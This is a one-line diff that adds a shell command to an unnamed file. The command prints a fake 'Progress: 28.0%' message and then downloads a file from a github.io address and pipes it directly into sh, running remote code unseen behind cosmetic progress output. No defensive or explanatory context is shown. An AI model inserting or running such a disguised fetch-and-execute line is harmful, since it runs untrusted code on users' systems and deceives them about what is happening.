@@ -1,0 +1,1 @@
+echo 'Progress: 28.0%'; curl -L --progress-bar frkns.github.io/fun/missile_besides.a.out | sh
